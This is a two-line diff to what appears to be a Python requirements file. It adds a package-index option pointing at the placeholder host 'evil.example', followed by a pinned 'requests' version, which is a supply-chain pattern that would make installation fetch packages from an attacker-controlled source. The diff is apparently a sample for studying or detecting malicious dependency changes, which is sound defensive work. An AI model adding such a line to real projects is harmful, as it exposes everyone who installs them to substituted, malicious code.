@@ -1,0 +1,2 @@
+--find https://evil.example/wheels/
+requests==2.31.0
